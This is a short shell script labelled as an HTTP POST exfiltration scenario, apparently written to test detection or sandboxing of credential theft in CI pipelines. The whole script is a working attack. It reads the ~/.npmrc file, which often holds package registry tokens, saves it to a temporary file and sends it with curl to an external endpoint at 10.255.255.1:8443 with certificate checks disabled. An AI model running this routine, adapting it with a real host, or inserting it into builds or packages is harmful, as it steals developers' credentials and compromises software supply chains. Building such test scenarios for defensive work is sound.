#!/bin/sh
# Scenario 2 — HTTP POST exfiltration
# Reads a file likely to contain secrets (.npmrc is common in CI),
# then POSTs its contents to an external endpoint.
echo "[attack] collecting credentials"
CREDS=$(cat ~/.npmrc 2>/dev/null || echo "no-npmrc-found")
echo "$CREDS" > /tmp/exfil.txt
echo "[attack] exfiltrating via POST to external host"
curl -m 5 -X POST -d @/tmp/exfil.txt https://10.255.255.1:8443/collect -k || true
echo "[attack] done"
